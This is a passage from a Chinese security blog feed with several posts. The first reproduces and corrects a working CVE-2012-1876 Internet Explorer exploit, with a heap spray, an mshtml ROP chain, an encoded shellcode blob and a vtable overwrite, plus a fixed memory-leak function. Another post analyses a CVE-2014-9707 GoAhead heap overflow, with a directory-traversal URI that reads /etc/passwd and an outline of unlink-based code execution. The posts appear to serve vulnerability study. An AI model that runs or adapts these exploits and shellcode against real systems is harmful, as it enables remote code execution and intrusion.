class="undefined">// A very special heap spray</span></span><br><span class="line"><span class="undefined">function heap_spray()&#123;</span></span><br><span class="line"><span class="undefined">	CollectGarbage();</span></span><br><span class="line"><span class="undefined">var heapobj = new Object();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">// generated with mona.py (mshtml.dll v)</span></span><br><span class="line"><span class="undefined">	function rop_chain(mshtmlbase)&#123;</span></span><br><span class="line"><span class="undefined">		var arr = [</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00001031),</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00002c78),    // pop ebp; retn</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x0001b4e3),    // xchg eax,esp; retn (pivot)</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00352c8b),    // pop eax; retn</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00001340),    // ptr to &amp;VirtualAlloc() [IAT]</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00124ade),    // mov eax,[eax]; retn</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x000af93e),    // xchg eax,esi; and al,0; xor eax,eax; retn</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00455a9c),    // pop ebp; retn</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00128b8d),    // &amp; jmp esp</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00061436),    // pop ebx; retn</span></span><br><span class="line"><span class="undefined">		0x00000001,    		   	    // 0x00000001-&gt; ebx</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x0052d8a3),    // pop edx; retn</span></span><br><span class="line"><span class="undefined">		0x00001000,    		   	    // 0x00001000-&gt; edx</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00003670),    // pop ecx; retn</span></span><br><span class="line"><span class="undefined">		0x00000040,    		   	    // 0x00000040-&gt; ecx</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x001d263d),    // pop edi; retn</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x000032ac),    // retn</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x00352c9f),    // pop eax; retn</span></span><br><span class="line"><span class="undefined">		0x90909090,    		   	    // nop</span></span><br><span class="line"><span class="undefined">		mshtmlbase + Number(0x0052e805),    // pushad; retn</span></span><br><span class="line"><span class="undefined">		0x90909090,</span></span><br><span class="line"><span class="undefined">		0x90909090,</span></span><br><span class="line"><span class="undefined">		0x90909090,</span></span><br><span class="line"><span class="undefined">		0x90909090,</span></span><br><span class="line"><span class="undefined">		0x90909090,</span></span><br><span class="line"><span class="undefined">    		];</span></span><br><span class="line"><span class="undefined">		return arr;</span></span><br><span class="line"><span class="undefined">	 &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function d2u(dword)&#123;</span></span><br><span class="line"><span class="undefined">	var uni = String.fromCharCode(dword &amp; 0xFFFF);</span></span><br><span class="line"><span class="undefined">	uni += String.fromCharCode(dword&gt;&gt;16);</span></span><br><span class="line"><span class="undefined">	return uni;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function tab2uni(heapobj, tab)&#123;</span></span><br><span class="line"><span class="undefined">	var uni = ""</span></span><br><span class="line"><span class="undefined">	for(var i=0;i&lt;tab.length;i++)&#123;</span></span><br><span class="line"><span class="undefined">	    uni += heapobj.d2u(tab[i]);</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">	return uni;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">heapobj.tab2uni = tab2uni;</span></span><br><span class="line"><span class="undefined">heapobj.d2u = d2u;</span></span><br><span class="line"><span class="undefined">heapobj.rop_chain = rop_chain;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var code = unescape("%u40b0%u414b%u1d24%ub4a8%u7799%ube37%ua947%ud41a%u353f%ueb30%ud133%u2ae1%u31e0%ue2d3%u1514%ufd13%u3497%u7a7b%ufc39%u92ba%u9390%u0a4e%ubbf5%u8db2%ue385%uf823%ud53a%u0448%u750d%ud632%u707c%u4642%u7e78%ub12c%u2f98%u1c3c%u727e%u3b7b%u4fe0%ue38c%u4f76%u81b0%u2de2%u35ba%u86bb%u67f8%u8d0c%u9190%u7574%u7f71%u7d3c%u9f15%ub347%ud50b%u784e%u4970%u1b37%uc1ff%uc6fe%uc0c7%ub6d4%u9246%ub4b1%uf588%ua91d%u7c4b%u2548%u7a99%u9b3d%u01b7%u34eb%u1cb5%u38a8%ub8fc%ud609%ube4a%u9714%ue121%ub904%u42b2%u7796%u6924%u80f9%u0dfd%u412c%u2f05%u273f%ubf40%u9893%u7343%u6679%u77a8%ub63f%u7472%u707b%u843d%uebd2%uf630%ubfd5%u71b2%u757a%u1848%u0cf5%u96b7%uf889%u764a%u9b2d%u92b0%u66be%u7d97%ub425%u9114%u4904%uba34%u421c%ue308%uf902%u4140%u4773%u0d27%u93b5%u2299%u1dd4%u7c4f%u2867%u98fc%u2c24%ue212%ufd03%u78a9%u3505%u8390%u2fe0%u4337%u154b%u468d%u79b9%u297f%ubbd6%u197e%u4ee1%u9fb8%ub1b3%u4a3c%u7a7d%u7679%u4670%u2091%u74e1%ub043%u4e71%ub590%u75b7%u983c%u4bb3%ud687%uf86b%u9b40%u117f%ud1f7%u7bf9%u152f%u3427%u1d92%u3d97%u2d49%u720d%u014f%u7ce0%u3105%u10eb%u35f5%ub4b6%u1c2c%u93b2%u4704%ud52b%ubbb1%ue389%u4137%u7e78%u733f%u7742%u2925%ufcd0%u6624%u8dba%u67b9%u1a96%ua8fd%ua9be%ud40b%u4899%u9f14%u87bf%ue2f7%ub80c%u903d%u14b0%u25bb%u7d96%u1a7f%u79f5%uf809%u347c%u7b91%u4e47%ueb81%ue122%ud41b%u7074%ub21d%u2d72%u928d%ub3b1%ua905%u71b4%u4b0c%u9343%u0d76%u989f%u84b5%ub7d5%u4666%ube40%ub8bf%u201c%u48e2%u4a73%u6b2c%u2afc%u04e0%u4941%u3777%u10ba%u7ed6%u332f%ub9fd%u7a9b%u7875%u2415%u1299%uf9d2%u3f97%ub63c%u3567%u27a8%ue386%u7742%u4f73%ue380%ua93c%u757c%uf62b%ud0c0%u27e0%u214b%ue1d3%ub93f%u157d%u8c14%ue2c1%u9904%u7498%u7071%u6637%ueb28%u4e1c%u7fb6%u357b%u3297%u25d4%uf569%u9105%u4047%u0224%u78d6%u7941%uba3d%u49b1%u7276%u1d2f%u85bf%u67fc%u7e92%u4a2c%u7ab4%u1348%u93d5%u8d9b%u03bb%u74fd%u0879%u43e1%ue083%u1873%u46e3%u2372%ub2f8%u88b0%ub8f9%u969f%u75b5%u770c%u7b42%ub72d%u7aa8%ue219%ueb38%ub334%u90be%u4f7e%u0d7f%ub3b6%u3076%ubff5%u479f%u7167%ud40a%u3b7c%u66fc%u41b7%u9615%u3dfd%u3505%ub825%u1c7d%ub54a%u3940%u37d6%u3f92%u971d%u1478%u8d49%ua8b2%u3493%u2c3c%u902f%ud54f%u04a9%u1198%u91f8%ub99b%u9943%ubbb1%u0d70%u4824%u4b0c%ube4e%ub02d%uf93a%u27ba%ub446%udb42%ud9d1%u2474%u5af4%uc929%u49b1%u8cbe%uc04a%u31a0%u1972%uc283%u0304%u1572%ubf6e%u483c%u40e7%u89bd%uc997%ub858%uae85%ue929%ua419%u027c%ue8d2%u9194%u2496%u129a%u131c%ua395%u9b91%u6779%u67b0%ub480%u5912%uc94b%u9e53%u22b6%u7701%u91bc%ufcb5%u2980%ud2b4%u128e%u57ce%ue650%u5964%u5781%u11f3%ud339%u825b%u3038%ufeb8%u3d73%u740a%u9782%u7543%ud7b4%u480f%uda78%u8c4e%u05bf%ue625%ub8c3%u3d3d%u66b9%ua0c8%uec19%u016a%u219b%uc2ec%u8e97%u8c7b%u11bb%ua6a8%u9ac0%u694f%ud841%uad6b%uba09%uf412%u6df7%ue62b%ud150%u6c89%u0672%u2eab%ueb1b%ud081%u63db%ua392%u2ce9%u2c08%ua442%uab96%u9fa5%u236e%u2058%u6d8e%u749f%u05de%uf536%ud5b5%u20b7%u8619%u9b17%u76d9%u4bd8%u9cb1%ub4d7%u9ea1%udd3d%u644b%u22d6%u6723%ucb43%u6831%u579a%u8ebc%u77f6%u19e8%ue16f%ud2b1%uee0e%u9f6c%u6411%u5f82%u8ddf%u73ef%u7d88%u2eba%u811f%u4411%u17a0%ucf9d%u8ff7%u369f%u103f%u1d60%u994b%udef4%ue624%udf18%ub0b4%udf72%u64dc%u8c26%u6af9%ua0f3%uff51%u90fb%ua806%u1e93%u9e70%ue03c%u1e57%u3701%ua49e%u3d73%u64f2");</span></span><br><span class="line"><span class="undefined">var rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ;</span></span><br><span class="line"><span class="undefined">var shellcode = rop_chain + code</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">while (shellcode.length &lt; 100000)</span></span><br><span class="line"><span class="undefined">shellcode = shellcode + shellcode;</span></span><br><span class="line"><span class="undefined">var onemeg = shellcode.substr(0, 64*1024/2);</span></span><br><span class="line"><span class="undefined">for (i=0; i&lt;14; i++) &#123;</span></span><br><span class="line"><span class="undefined">onemeg += shellcode.substr(0, 64*1024/2);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">onemeg += shellcode.substr(0, (64*1024/2)-(38/2));</span></span><br><span class="line"><span class="undefined">var spray = new Array();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">for (i=0; i&lt;400; i++) &#123;</span></span><br><span class="line"><span class="undefined">spray[i] = onemeg.substr(0, onemeg.length);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function smash_vtable()&#123;</span></span><br><span class="line"><span class="undefined">	var obj_col_0 = document.getElementById("132");</span></span><br><span class="line"><span class="undefined">	obj_col_0.width = "1178993";                    // smash the vftable 0x07070024</span></span><br><span class="line"><span class="undefined">	obj_col_0.span = "44";                      // the amount to overwrite</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">var mshtmlbase = "";</span></span><br><span class="line"><span class="undefined">setTimeout("over_trigger();",1);	</span></span><br><span class="line"><span class="undefined">setTimeout("heap_spray();",400);</span></span><br><span class="line"><span class="undefined">setTimeout("smash_vtable();",700);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我觉得吧，上面的<code>over_trigger</code>函数实现有点不对啊。</p>
<p>让咱仔细说说为啥不对，溢出时内存布局大致如下<br><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/img/20160202220100.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure></p>
<p>溢出后，over_trigger函数被执行，它从<code>arr</code>数组中搜索被修改的字符串，搜索到之后偏移<code>0x100-6</code>个字节去获取<code>CButtonLayout</code>的虚表指针。也就是说，它总是当作自己搜索到被修改的字符串对象是<code>BBBB....</code>，然而它很有可能获取的是<code>AAAA...</code>的对象啊，因为溢出时，从<code>VulHeap</code>开始到<code>BBBB...</code>的内存都被覆盖了（并不完全覆盖整片内存，而是间隔覆盖，具体看书)，<code>arr</code>数组中，<code>AA...</code>的对象总是在<code>B...</code>的前面，所以一旦<code>AAA...</code>对象的长度被覆盖的话，那么<code>over_trigger</code>获取<code>mshtml</code>的基址将是错误的。。。</p>
<p>修改后的<code>over_trigger</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">over_trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> leak_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( arr[i].length &gt; (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span> ) &#123; <span class="comment">// overflowed</span></span><br><span class="line">leak_index = i;</span><br><span class="line">            <span class="keyword">var</span> leak = arr[i].substring((<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+(<span class="number">2</span>+<span class="number">8</span>)/<span class="number">2</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+(<span class="number">2</span>+<span class="number">8</span>+<span class="number">4</span>)/<span class="number">2</span>);</span><br><span class="line">            leak_addr = <span class="built_in">parseInt</span>( leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span> );</span><br><span class="line">mshtmlbase = leak_addr - <span class="built_in">Number</span>(<span class="number">0x001582b8</span>);</span><br><span class="line">alert(mshtmlbase);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( leak_addr == <span class="number">-1</span> || leak_index == <span class="number">-1</span> ) &#123; alert(<span class="string">"memory leak failed...."</span>); &#125;</span><br><span class="line"><span class="comment">//return mshtmlbase;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《漏洞战争》第三章中有讲Cve-2012-1876，书上带的exp如下：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br
    
    </summary>
    
    
      <category term="漏洞战争" scheme="http://www.ench4nt3r.com/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"/>
    
      <category term="exploit" scheme="http://www.ench4nt3r.com/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>WindowsXP堆思维导图</title>
    <link href="http://www.ench4nt3r.com/2016/10/04/WindowsXP%E5%A0%86%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <id>http://www.ench4nt3r.com/2016/10/04/WindowsXP堆思维导图/</id>
    <published>2016-10-03T16:00:01.000Z</published>
    <updated>2017-07-09T06:18:52.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>
<p>环境：Windows pro sp3</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/img/Windows堆思维导图.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>
<p>参考《软件调试》</p>
]]></content>
    
    <summary type="html">
    
      &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;环境：Windows pro sp3&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;di
    
    </summary>
    
    
      <category term="Windows" scheme="http://www.ench4nt3r.com/tags/Windows/"/>
    
      <category term="堆" scheme="http://www.ench4nt3r.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2014-9707分析以及exp构造</title>
    <link href="http://www.ench4nt3r.com/2016/07/07/CVE-2014-9707%E5%88%86%E6%9E%90%E5%8F%8AEXP%E6%9E%84%E9%80%A0/"/>
    <id>http://www.ench4nt3r.com/2016/07/07/CVE-2014-9707分析及EXP构造/</id>
    <published>2016-07-06T16:03:40.000Z</published>
    <updated>2017-07-09T06:17:02.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h3><blockquote>
<p>Embedthis Software GoAhead是美国Embedthis Software公司的一款嵌入式Web服务器。<br>Embedthis Software GoAhead 3.0.0版本至3.4.1版本中存在安全漏洞，该漏洞源于程序没有正确处理以‘.’字符开始的路径部分。远程攻击者可借助特制的URI利用该漏洞实施目录遍历攻击，造成拒绝服务（基于堆的缓冲区溢出和崩溃），也可能执行任意代码。[1]</p>
</blockquote>
<a id="more"></a>
<h3 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h3><p>Ubuntu 15.10(I686，关闭ASLR、NX)</p>
<p>Goahead 3.4.1</p>
<p>Glibc 2.19</p>
<h3 id="0x02-漏洞产生分析"><a href="#0x02-漏洞产生分析" class="headerlink" title="0x02 漏洞产生分析"></a>0x02 漏洞产生分析</h3><p>瞧瞧代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (mark = sp = dupPath; *sp; sp++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*sp == <span class="string">'/'</span>) &#123;</span><br><span class="line">        *sp = <span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">while</span> (sp[<span class="number">1</span>] == <span class="string">'/'</span>) &#123;</span><br><span class="line">            sp++;</span><br><span class="line">        &#125;</span><br><span class="line">        segments[nseg++] = mark;</span><br><span class="line">        len += (<span class="keyword">int</span>) (sp - mark);</span><br><span class="line">        mark = sp + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">segments[nseg++] = mark;</span><br><span class="line">len += (<span class="keyword">int</span>) (sp - mark);</span><br></pre></td></tr></table></figure></p>
<p>在函数websNormalizeUriPath中，第一个for代码块，会将URI以’/‘分割，放入数组，并且统计URI字符串长度（不包括’/‘）。</p>
<p>来，让我们举个栗子看下。</p>
<p>websNormalizeUriPath收到了一个字符串参数，内容是”/hello/./world/.x”。第一个for君勤勤恳恳地工作，将字符串以’/‘分割并且统计好长度。此时各个变量的内容是这样的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">segments[<span class="number">0</span>]: <span class="string">'\0'</span></span><br><span class="line"></span><br><span class="line">segments[1]: 'hello'</span><br><span class="line"></span><br><span class="line">segments[<span class="number">2</span>]: <span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">segments[3]: 'world'</span><br><span class="line"></span><br><span class="line">segments[4]: '.x'</span><br><span class="line"></span><br><span class="line">segments[<span class="number">5</span>] : <span class="string">'\0'</span></span><br><span class="line"></span><br><span class="line">len: <span class="number">13</span></span><br><span class="line"></span><br><span class="line">nseg : <span class="number">5</span></span><br></pre></td></tr></table></figure></p>
<p>现在来到了最重要的时刻，第二个for君要上场工作了。先看下它长啥样。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = i = <span class="number">0</span>; i &lt; nseg; i++, j++) &#123;</span><br><span class="line">    sp = segments[i];</span><br><span class="line">    <span class="keyword">if</span> (sp[<span class="number">0</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sp[<span class="number">1</span>] == <span class="string">'\0'</span>)  &#123;</span><br><span class="line">            <span class="keyword">if</span> ((i+<span class="number">1</span>) == nseg) &#123;</span><br><span class="line">                segments[j] = <span class="string">""</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sp[<span class="number">1</span>] == <span class="string">'.'</span> &amp;&amp; sp[<span class="number">2</span>] == <span class="string">'\0'</span>)  &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">1</span> &amp;&amp; *segments[<span class="number">0</span>] == <span class="string">'\0'</span>) &#123;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((i+<span class="number">1</span>) == nseg) &#123;</span><br><span class="line">                <span class="keyword">if</span> (--j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    segments[j] = <span class="string">""</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                j = max(j - <span class="number">2</span>, <span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        segments[j] = segments[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>segments同时肩负输入和输出的重任，i控制输入流的偏移，j控制输出流的偏移。</p>
<p>此时有两种情况处理，当sp为 ‘.’ 时，做一些操作。当sp不为 ‘.’ 时，直接将输入复制到输出。</p>
<p>仔细瞧瞧当sp为’.’时的处理，它做了以下的动作：</p>
<ol>
<li>当下一个字符为0时，如果输出流到了末尾时((i+1) == nseg)，直接复制空字符串到输出流。否则输出流不变(j–，在for的循环表达式中j++，以保持不变）</li>
<li>当下一个字符为 ‘.’ 并且sp[2]为0时，也就是sp为 “..”时。做<em>*</em>操作。（这里不讲了，不是重点。）</li>
<li>重点来了，如果sp不是上面两种情况，将会啥都不做，比如sp为”.x”的话，那么它啥也不做，并且在for的循环表达式中将i跟j自增。</li>
</ol>
<p>继续举个栗子瞧瞧：</p>
<p>还是以上面的字符串为例“/hello/./world/.x”</p>
<ol>
<li>‘hello’直接从输入复制到输出</li>
<li>‘.’，j - 1。以保持不变</li>
<li>‘world’，将输入复制到输出。注意，在第2步中因为j不变，所以j现在是2，也就是’.’的位置。</li>
<li>‘.x’，啥也不做，i++，j++。</li>
<li>到这里已经结束了，nseg为5，现在i也是5了，j为4</li>
</ol>
<p>看看调整后segments的内容：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">segments[<span class="number">0</span>]: <span class="string">'\0'</span>				<span class="comment">// 长度 0</span></span><br><span class="line"></span><br><span class="line">segments[1]: 'hello'   			// 长度 5</span><br><span class="line"></span><br><span class="line">segments[2]: 'world'			// 长度 5</span><br><span class="line"></span><br><span class="line">segments[3]: 'world'			// 长度 5</span><br><span class="line"></span><br><span class="line">segments[4]: '.x'				// 长度 2</span><br><span class="line"></span><br><span class="line">segments[<span class="number">5</span>] : <span class="string">'\0'</span></span><br></pre></td></tr></table></figure></p>
<p>继续往下走<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nseg = j;</span><br><span class="line">assert(nseg &gt;= <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ((path = walloc(len + nseg + <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, dp = path; i &lt; nseg; ) &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(dp, segments[i]);</span><br><span class="line">        len = (<span class="keyword">int</span>) slen(segments[i]);</span><br><span class="line">        dp += len;</span><br><span class="line">        <span class="keyword">if</span> (++i &lt; nseg || (nseg == <span class="number">1</span> &amp;&amp; *segments[<span class="number">0</span>] == <span class="string">'\0'</span> &amp;&amp; firstc == <span class="string">'/'</span>)) &#123;</span><br><span class="line">            *dp++ = <span class="string">'/'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *dp = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>len使用的还是分割时计算的（13）。nseg被改成了j（4）。</p>
<p>看看上面调整后segments内字符串的长度：0 + 5 + 5 + 5 = 15。(nseg为4）</p>
<p>path new时的长度是13 + 4 + 1 (len + nseg + 1)，而复制到path的字符串长度将是15 + 3 + 1。</p>
<p>很明显，在这发生了溢出。只要稍微构造一下就能触发unlink了。</p>
<p>漏洞分析完毕。</p>
<h3 id="0x03-目录遍历"><a href="#0x03-目录遍历" class="headerlink" title="0x03 目录遍历"></a>0x03 目录遍历</h3><p>来，我们准备了这么一个字符串”/../../../../../.x/.x/.x/.x/.x/.x/etc/passwd”，在第二个for君的处理中，遇到”..”并且没到末尾的话，会将j-1，或者置0。</p>
<p>在处理了一连串的”..”之后，遇到了”.x”，我们知道它只会将i、j加1。看看处理完之后的segments吧<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p segments[<span class="number">0</span>]</span><br><span class="line">$<span class="number">9</span> = <span class="number">0x8055a30</span> <span class="string">""</span></span><br><span class="line">(gdb) p segments[<span class="number">1</span>]</span><br><span class="line">$<span class="number">10</span> = <span class="number">0x8055a31</span> <span class="string">".."</span></span><br><span class="line">(gdb) p segments[<span class="number">2</span>]</span><br><span class="line">$<span class="number">11</span> = <span class="number">0x8055a34</span> <span class="string">".."</span></span><br><span class="line">(gdb) p segments[<span class="number">3</span>]</span><br><span class="line">$<span class="number">12</span> = <span class="number">0x8055a37</span> <span class="string">".."</span></span><br><span class="line">(gdb) p segments[<span class="number">4</span>]</span><br><span class="line">$<span class="number">13</span> = <span class="number">0x8055a3a</span> <span class="string">".."</span></span><br><span class="line">(gdb) p segments[<span class="number">5</span>]</span><br><span class="line">$<span class="number">14</span> = <span class="number">0x8055a3d</span> <span class="string">".."</span></span><br><span class="line">(gdb) p segments[<span class="number">6</span>]</span><br><span class="line">$<span class="number">15</span> = <span class="number">0x8055a52</span> <span class="string">"etc"</span></span><br><span class="line">(gdb) p segments[<span class="number">7</span>]</span><br><span class="line">$<span class="number">16</span> = <span class="number">0x8055a56</span> <span class="string">"passwd"</span></span><br><span class="line">(gdb) p segments[<span class="number">8</span>]</span><br><span class="line">$<span class="number">17</span> = <span class="number">0x8055a46</span> <span class="string">".x"</span></span><br><span class="line"></span><br><span class="line">(gdb) p nseg </span><br><span class="line">$<span class="number">23</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure></p>
<p>详情请看参考[2]的Directory traversal</p>
<h3 id="0x04-远程命令执行"><a href="#0x04-远程命令执行" class="headerlink" title="0x04 远程命令执行"></a>0x04 远程命令执行</h3><p>当执行到wfree(dupPath);的时候，内存布局大概如下：<br><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="http://i2.piimg.com/4851/7e85282784b02680.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure></p>
<p>path是能通过url控制的区域，只要溢出并且覆盖top的size（重点是覆盖点p位，置为0），这样的话，当free(segments)时，就会判断path是否为空闲，由于前面被我们将top的p位置为0，所以此时会unlink(path)。通过在path准备点蛋糕，就可以让shellcode执行了。</p>
